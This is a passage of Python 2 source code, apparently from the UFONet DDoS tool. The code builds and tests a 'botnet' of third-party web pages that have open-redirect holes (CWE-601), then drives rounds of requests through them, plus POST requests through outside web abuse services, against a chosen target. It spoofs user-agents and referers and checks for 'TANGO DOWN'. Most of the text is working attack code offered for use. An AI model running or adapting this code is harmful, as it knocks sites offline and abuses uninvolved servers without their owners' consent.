            except Exception:
                print "[Error] UCAV: " + check_engine + " -> FAILED (cannot connect!)"
        if num_is_down > 0 and num_is_up == 0: # check for: 1 or more down, 0 up
            print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
            if not self.options.forceyes:
                update_reply = raw_input("Wanna send a [HEAD] check request from your proxy (y/N)")
                print '-'*25
            else:
                update_reply = "N"
            if update_reply == "y" or update_reply == "Y":
                try: # send HEAD connection
                    self.head = True
                    reply = self.connect_zombie(target)
                    self.head = False
                    if reply:
                        print "\n[Info] Wow! Target is replying you... Keep shooting!\n"
                    else:
                        print "\n[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
                        if not self.options.web:
                            sys.exit(2) # exit
                except Exception:
                    print "[Error] Something wrong with your connection!"
                    if self.options.verbose:
                        traceback.print_exc()
                return #sys.exit(2)
            else:
                print "[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
                if not self.options.web:
                    sys.exit(2) # exit

    def send_aliens(self, target):
        # extract external web abuse services urls and perform requests against target
        options = self.options
        print "\n[Info] Deploying heavy alien troops with 'laser-cannon' weapons...\n"
        aliens = self.extract_aliens() # extract aliens from file
        shuffle(aliens) # suffle aliens 
        for alien in aliens:
            if "$POST" in alien: # extract alien/parameters -> search for $POST delimiter on 'aliens.txt' file
                regex_alien = re.compile('{}(.*){}'.format(re.escape(''), re.escape(';$POST'))) # regex magics
                pattern_alien = re.compile(regex_alien)
                alien_url = re.findall(pattern_alien, alien) # HTTP POST url for submit data
                regex_param = re.compile('{}(.*){}'.format(re.escape('$POST;'), re.escape(''))) # regex magics
                pattern_param = re.compile(regex_param)
                param = re.findall(pattern_param, alien) # HTTP POST params to submit
                for u in alien_url:
                    url = u # ex: POST -> path/submit.php
                print "[Info] Firing from: " + url
                for p in param:
                    param_target = {p : target} # ex POST -> url=target
                    param_target = urllib.urlencode(param_target)
                self.user_agent = random.choice(self.agents).strip() # suffle user-agent 
                headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                try:
                    if options.verbose:
                        print "[Info] Sniping: " + url + " - POST:", param_target
                    t = urlparse(url)
                    name_alien = t.netloc
                    path_alien = t.path
                    if url.startswith("http://"):
                        h = httplib.HTTPConnection(name_alien)
                    if url.startswith("https://"):          
                        h = httplib.HTTPSConnection(name_alien)
                    h.request('POST', path_alien, param_target, headers)
                    #r = h.getresponse()
                    #print r.read()
                except Exception:
                    print "[Error] Alien: " + alien + " -> FAILED (cannot connect!)"

    def extract_aliens(self):
        # extract aliens from file (ex: 'aliens.txt')
        options = self.options
        try:
            f = open('aliens.txt')
            aliens = f.readlines()
            aliens = [ alien.replace('\n','') for alien in aliens ]
            f.close()
            if not aliens:
                print "\n[Error] - Imposible to retrieve 'aliens' from file.\n"
                return
            else:
                return aliens
        except:
            if os.path.exists('aliens.txt') == True:
                print '\n[Error] - Cannot open:', 'aliens.txt', "\n"
                return #sys.exit(2)
            else:
                print '\n[Error] - Cannot found:', 'aliens.txt', "\n"
                return #sys.exit(2)

    def extract_zombies(self):
        # extract targets from file (ex: 'zombies.txt')
        options = self.options
        if self.options.test:
            try:
                f = open(options.test)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to extract 'zombies' from file "+options.test+".\n"
                    return
                else:
                    return zombies
            except:
                if os.path.exists(options.test) == True:
                    print '\n[Error] - Cannot open:', options.test, "\n"
                    return #sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', options.test, "\n"
                    return #sys.exit(2)
        else:
            try:
                f = open('zombies.txt')
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from file.\n"
                    return
                else:
                    return zombies
            except:
                if os.path.exists('zombies.txt') == True:
                    print '\n[Error] - Cannot open:', 'zombies.txt', "\n"
                    return #sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                    return #sys.exit(2)

    def update_zombies(self, zombies_ready):
        # update zombies on file (ex: 'zombies.txt')
        options = self.options
        if options.attackme:
            f = open("zombies.txt", "w") # re-write list
            for zombie in self.doll.real_zombies: # add only alien verified zombies
                for x in zombie:
                    f.write(str(x) + os.linesep)
            f.close()

        if options.test:
            f = open(options.test, "w") # re-write list only with zombies ready
            for zombie in zombies_ready:
                f.write(zombie + os.linesep)
            f.close()

        if options.search or options.dorks or options.download: # append only new zombies to list
            f = open('zombies.txt')
            zombies_on_file = f.read().splitlines()
            with open("zombies.txt", "a") as zombie_list: 
                for zombie in zombies_ready:
                    if zombie not in zombies_on_file: # parse possible repetitions
                        zombie_list.write(zombie + os.linesep)
            f.close()

    def testing(self, zombies):
        # test Open Redirect vulnerabilities on webapps and show statistics
        # HTTP HEAD check
        print ("Are 'they' alive? :-) (HEAD Check):")
        print '='*35
        num_active_zombies = 0
        num_failed_zombies = 0
        active_zombies = []
        army = 0
        print "Trying:", len(zombies)
        print '-'*21
        for zombie in zombies:
            zombie = str(zombie)
            if zombie.startswith("http://") or zombie.startswith("https://"):
                # send HEAD connection
                self.head = True
                self.connect_zombies(zombie)
        while self.herd.no_more_zombies() == False:
            time.sleep(1)
        for zombie in self.herd.done:
            zombie = str(zombie)
            t = urlparse(zombie)
            if self.herd.get_result(zombie):
                code_reply = self.herd.get_result(zombie)
                self.head = False
                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                    name_zombie = t.netloc
                    print "Zombie:", name_zombie
                    print "Status: Ok ["+ code_reply + "]"
                    num_active_zombies = num_active_zombies + 1
                    active_zombies.append(zombie)
                elif code_reply == "404":
                    print "Zombie:", t.netloc
                    print "Status: Not Found ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
                else:
                    print "Zombie:", t.netloc, zombie
                    print "Status: Not Allowed ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
            else:
                if self.options.verbose:
                    print "Reply:", "\n\nNothing!!!!!\n"
                print "Zombie:", zombie
                print "Status: Malformed!"
                num_failed_zombies = num_failed_zombies + 1
            print '-'*10
        self.herd.reset()
        print '='*18
        print "OK:", num_active_zombies, "Fail:", num_failed_zombies
        print '='*18
        if num_active_zombies == 0:
            print "\n[Info] - Not any zombie active!\n"
            return #sys.exit(2)
        print '='*22
        # check url parameter vectors
        print ("Checking for payloads:")
        print '='*22
        print "Trying:", num_active_zombies
        print '-'*21
        zombies_ready = []
        num_waiting_zombies = 0
        num_disconnected_zombies = 0
        for zombie in active_zombies:
            zombie = str(zombie)
            t = urlparse(zombie)
            name_zombie = t.netloc
            #print "Vector:", zombie
            self.payload = True
            try:
                self.connect_zombies(zombie)
            except:
                pass
            self.payload = False
        time.sleep(1)
        while self.herd.no_more_zombies() == False:
            time.sleep(1)
        for zombie in self.herd.done:
            zombie = str(zombie)
            t = urlparse(zombie)
            name_zombie = t.netloc
            payload_zombie = zombie
            payload_reply = ""
            print "Vector:", payload_zombie
            self.payload = True
            if self.herd.get_result(zombie):
                payload_reply = self.herd.get_result(zombie)
            self.payload = False
            if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
                num_waiting_zombies = num_waiting_zombies + 1
                print "Status:", "Waiting your orders..."
                zombies_ready.append(zombie)
            else:
                num_disconnected_zombies = num_disconnected_zombies + 1
                print "Status:", "Not ready..."
            army = army + 1
            print '-'*10
        self.herd.reset()
        print '='*18
        print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
        print '='*18
        print '='*18
        # list of 'zombies' ready to attack
        print ("Army of 'zombies'")
        print '='*18
        num_active_zombie = 0
        for z in zombies_ready:
            t = urlparse(z)
            name_zombie = t.netloc
            num_active_zombie = num_active_zombie + 1
            if self.options.verbose:
                print "Zombie [", num_active_zombie, "]:", name_zombie
        print '-'*18
        print "Total Army:", num_active_zombie
        print '-'*18
        # update 'zombies' list
        if num_active_zombie == 0:
            print "\n[Info] - Not any zombie active!\n[Info] Update will delete zombie file\n"
        if not self.options.forceyes:
            update_reply = raw_input("Wanna update your army (Y/n)")
            print '-'*25
        else:
            update_reply = "Y"
        if update_reply == "n" or update_reply == "N":
            print "\nBye!\n"
            return #sys.exit(2)
        else:
            self.update_zombies(zombies_ready)
            print "\n[Info] - Botnet updated! ;-)\n"

    def attacking(self, zombies):
        # Perform a DDoS Web attack against a target, using Open Redirect vectors on third party machines (aka 'zombies')
        target = self.options.target
        if target.startswith("http://") or target.startswith("https://"):
            print "Attacking: ", target
            print '='*55, "\n"
            # send Open Redirect injection (multiple zombies-one target url)
            reply = self.injection(target, zombies)
        else:
            print "\n[Error] - Target url not valid!\n"

    def attackme(self, zombies):
        # Perform a DDoS Web attack against yourself
        print "Starting local port to listening at: " + self.port + "\n" 
        print '='*21 + "\n"
        self.doll=Doll(self)
        self.doll.start()
        while not self.doll._armed:
            time.sleep(1)
        # send Open Redirect injection (multiple zombies-multiple target urls)
        target = ""
        self.injection(target, zombies)
        self.doll.shutdown()
        self.doll.join()
        self.herd.list_fails()

    def injection(self, target, zombies, head_check = True):
        options = self.options
        head_check_here = False
        head_check_external = False
        print '='*21
        self.head = True
        if head_check:
            if not options.attackme:
                print "Round: 'Is target up?'"
                print '='*21
                try: # send HEAD connection
                    reply = self.connect_zombie(target)
                    if reply:
                        print "[Info] From here: YES"
                        head_check_here = True
                    else:
                        print "[Info] From Here: NO | Report: From here your target looks DOWN!"
                        head_check_here = False
                except Exception:
                    print "[Error] From Here: NO | Report: Check failed from your connection..."
                    if self.options.verbose:
                        traceback.print_exc()
                    head_check_here = False
            else: # check if local IP/PORT is listening on mothership
                print "Round: 'Is NAT ready?'"
                print '='*21
                try:
                    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                    result = sock.connect_ex(('0.0.0.0',8080))
                    if result == 0 or result == 110: # tmp black magic
                        print "[Info] Local port: YES | Report: Mothership accesible on -private- IP: http://0.0.0.0:8080"
                        head_check_here = True
                    else:
                        print "[Error] Local port: NO | Report: Something wrong on your port: 8080"
                        head_check_here = False
                except Exception:
                    print "[Error] Local port: NO | Report: Something wrong checking open port ;("
                    if self.options.verbose:
                        traceback.print_exc()
                    head_check_here = False
            print '-'*21
        else:
            head_check_here = True
        self.head = False

        # check target on third party service
        self.external = True
        if not options.attackme:
            try:
                external_reply = self.connect_zombie(target)
                if "It's just you" in external_reply: # parse from external service: http://www.downforeveryoneorjustme.com
                    print "[Info] From exterior: YES"
                    head_check_external = True
                else: # parse from external service: http://isup.me
                    url = "http://isup.me/" + target
                    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                    req = urllib2.Request(url, None, headers)
                    req_reply = urllib2.urlopen(req).read()
                    if 'is up' in req_reply: # parse external service for reply
                        print "[Info] From exterior: YES"
                        head_check_external = True
                    else:
                        print "[Info] From exterior: NO | Report: From external services your target looks DOWN!"
                        head_check_external = False
            except Exception:
                    print "[Error] From exterior: NO | Cannot reach external services from your network..."
                    head_check_external = False
        else:
            self.head = True
            try: # check mothership from public ip / NAT using HEAD request
                import httplib
                try:
                    conn = httplib.HTTPConnection(str(self.pub_ip), 8080, timeout=10)
                    conn.request("HEAD", "/")
                    reply = conn.getresponse() 
                except Exception:
                    reply = None
                if reply:
                    print "[Info] From exterior: YES | Report: Mothership accesible from Internet ;-)"
                    head_check_external = True
                else:
                    print "[Error] From exterior: NO | Report: Cannot access to mothership on -public- url:", target
                    head_check_external = False
                    head_check_here = False # stop attack if not public IP available
            except Exception:
                print "[Error] From exterior: NO | Report: Check failed from your connection..."
                head_check_here = False # stop attack if not public IP available
                if self.options.verbose:
                    traceback.print_exc()
                head_check_external = False
            self.head = False
        print '-'*21
        self.external = False

        # ask for start the attack
        if head_check_here == True or head_check_external == True:
            if not self.options.forceyes: 
                if not options.attackme:
                    start_reply = raw_input("[Info] Your target looks ONLINE!. Wanna start a DDoS attack? (y/N)\n")
                else:
                    start_reply = raw_input("[Info] Your mothership looks READY!. Wanna start a DDoS attack against yourself? (y/N)\n")
            else:
                start_reply = "Y"
            if start_reply == "y" or start_reply == "Y":
                if options.attackme:
                    total_rounds = "2" # default rounds for attackme
                else:
                    total_rounds = options.rounds # extract number of rounds
                if total_rounds <= "0":
                    total_rounds = "1"
		self.herd.cleanup()
                num_round = 1
                num_hits = 0
                num_zombie = 1
                # start to attack the target with each zombie
                zombies = self.extract_zombies() # extract zombies from file
                total_zombie = len(zombies)
                self.herd=Herd(self)
                for i in range(0, int(total_rounds)):
                    shuffle(zombies) # suffle zombies order, each round :-)
                    print ("\x1b[2J\x1b[H")# clear screen (black magic)
                    print '='*42
                    print 'Starting round:', num_round, ' of ', total_rounds
                    print '='*42
                    self.herd.reset()
                    for zombie in zombies:
                        t = urlparse(zombie)
                        name_zombie = t.netloc
                        if not self.options.attackme:
                            print "[Info] Attacking from: " + name_zombie
                        else: # on attackme target url is dynamic -> http://public_ip:port/hash|zombie
                            target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                            self.options.target = target
                            if target.startswith("http://") or target.startswith("https://"):
                                print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
                                print "Payload: " + target
                                print '='*55, "\n"
                        self.attack_mode = True
                        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
                        self.connect_zombies(zombie)
                    time.sleep(1)
                    for zombie in self.herd.done:
                        if self.herd.connection_failed(zombie) == False:
                            num_hits = num_hits + 1
                        num_zombie = num_zombie + 1
                        if num_zombie > total_zombie:
                            num_zombie = 1
                    while self.herd.no_more_zombies() == False:
                        time.sleep(1)
                    num_round = num_round + 1
                    if not self.options.disablealiens and not self.options.attackme: # different layers requests -> pure web abuse 
                        send_aliens = self.send_aliens(target)
                    if not self.options.disableisup and not self.options.attackme: # perform an external 'is target up?' check 
                        check_is_up = self.check_is_up(target)
                    print "-"*21
                    self.herd.dump_html()
                attack_mode = False
                print ("\x1b[2J\x1b[H") # black magic
                if not self.options.attackme: # show herd results
                    self.herd.dump()
                else: # show doll results
                    print '='*21
                    print "\n[Info] - Mothership transmission...\n"
                    num_real_zombies = len(self.doll.real_zombies)
                    print "Total 'zombies' 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
                    for z in self.doll.real_zombies: # show only alien verified zombies
                        for x in z:
                            print " - " + str(x)
                self.herd.dump_html(True)
                print "\n" # gui related
                print '='*21
                if not self.options.attackme:
                    print "\n[Info] - Attack completed! ;-)\n"
                else:
                    if num_real_zombies < 1: # not any 100% vulnerable zombie found
                        print "\n[Info] - Not any 100% vulnerable zombie found... Bye!\n"
                        if os.path.exists('mothership') == True:
                            os.remove('mothership') # remove mothership stream
                        if os.path.exists('alien') == True:
                            os.remove('alien') # remove random alien worker
                        sys.exit(2)
            else:
                print "\nBye!\n"
                if os.path.exists('mothership') == True:
                    os.remove('mothership') # remove mothership stream
                if os.path.exists('alien') == True:
                    os.remove('alien') # remove random alien worker
                if not options.web:
                    sys.exit(2) # exit
                else:
                    return
        else:
            if not options.attackme:
                print "[Info] Your target ("+target+") is OFFLINE!! ;-)" 
            else:
                print "[Error] Your NAT/Network is not correctly configurated..."
            print '-'*25
            print "\nBye!\n"
            if os.path.exists('mothership') == True:
                os.remove('mothership') # remove mothership stream
            if os.path.exists('alien') == True:
                os.remove('alien') # remove random alien worker
            if not options.web:
                sys.exit(2) # exit
            else:
                return

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()
